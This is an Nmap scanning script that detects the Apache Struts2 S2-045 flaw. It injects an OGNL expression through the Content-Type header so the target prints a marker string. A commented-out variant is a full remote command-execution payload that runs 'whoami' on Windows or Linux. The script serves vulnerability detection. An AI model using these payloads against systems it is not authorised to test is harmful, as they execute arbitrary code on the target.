description = [[
Struts2 S2-045 Nmap Scan Script
# Struts2 S2-045 Vulnerabilities info
[CNNVD-2017-03-07](http://cnnvd.org.cn/notice/show/id/8230)

[CNTA-2017-0016](http://www.cnvd.org.cn/webinfo/show/4080)

[US-CERT](https://www.us-cert.gov/ncas/current-activity/2017/03/08/Apache-Software-Foundation-Releases-Security-Updates)

# Usage script
1、copy struts2-scan.nse to nmap script folder

2、run `nmap -script struts2-scan -sS -p 80,8080,81,82,83,84,85,86,87,88,8888,8088 -n -d ip -oX outscan.xml`
# Risk Awareness Report
[Struts2 S2-045 Risk Awareness Report](http://plcscan.org/blog/2017/03/struts2-s2-045-risk-awareness-report-from-beaconla

]]

---
-- nmap -script struts2-scan -sS -p 80,8080,81,82,83,84,85,86,87,88,8888,8088 -n -d ip -oX outscan.xml
--
-- BeaconLab http://plcscan.org/blog/
---

categories = {"discovery", "safe"}
author = "Z-0ne"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

local http = require "http"
local target = require "target"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"

--use script to scan any open TCP port
portrule = function(host, port)
  return port.state == "open"
end


action = function(host, port)
  local output = stdnse.output_table()
  local options
  local payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('Struts2S2045Checks!!!')).(#o.close())}"
  --local payload_cmd = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
  local useragent = "Mozilla/5.0"
  options = {header = {}, timeout = 15000}
  options["header"]["Content-type"] = payload
  options["header"]["User-Agent"] = useragent
  local response = http.get(host, port, "/", options)
  if response.status == 200 then
    if string.find(response.body, "Struts2S2045Checks") ~= nil then
	  -- exclude index "php default phpinfo() page"
	  if string.find(response.body, "phpinfo") == nil then
		--response: 0000   53 74 72 75 74 73 32 53 32 30 34 35 43 68 65 63  Struts2S2045Chec
                --          0010   6b 73 21 21 21                                   ks!!!
	    if #response.body == 21 then
              output["status"] = "S2-045-AChecks vuln21"
	      return output
		--response: 0000   53 74 72 75 74 73 32 53 32 30 34 35 43 68 65 63  Struts2S2045Chec
                --          0010   6b 73 21 21 21 0a                                ks!!!.
            elseif #response.body == 22 then
              output["status"] = "S2-045-AChecks vuln22"
	      return output
		--response: 0000   53 74 72 75 74 73 32 53 32 30 34 35 43 68 65 63  Struts2S2045Chec
                --          0010   6b 73 21 21 21 0d 0a                             ks!!!..
            elseif #response.body == 23 then
              output["status"] = "S2-045-AChecks vuln23"
	      return output
            elseif  #response.body < 50 then 
              output["status"] = "S2-045-AChecks"
              output["resplength"] = #response.body
              return output
            else
              output["status"] = "S2-045-AChecks lengtherror"
              output["resplength"] = #response.body
              return output
            end
	  end
	end
  end
  if response.status == 302 or response.status == 301 then
    if response.location then
      local parseurl = http.parse_url(response.location[#response.location])
    --fix location http://127.0.0.1/login.action to http://host:port/uri
      local response = http.get(parseurl.host,port,parseurl.path,options)
      if response.status == 200 then
        if string.find(response.body, "Struts2S2045Checks") ~= nil then
          if string.find(response.body, "phpinfo") == nil then
            if #response.body == 21 then
              output["status"] = "S2-045-BChecks vuln21"
              return output
            elseif #response.body == 22 then
              output["status"] = "S2-045-BChecks vuln22"
              return output
            elseif #response.body == 23 then
              output["status"] = "S2-045-BChecks vuln23"
              return output
            elseif  #response.body < 50 then
              output["status"] = "S2-045-BChecks"
              output["resplength"] = #response.body
              return output
            else
              output["status"] = "S2-045-BChecks lengtherror"
              output["resplength"] = #response.body
              return output
            end			  
          end
        end
      end
    end
  end
  -- Debug 
  -- if response.status == 404 and response.body then
    -- output["status"] = "S2-045-CChecks"
	-- output["res"] = response.body
	-- return output
  -- end
end
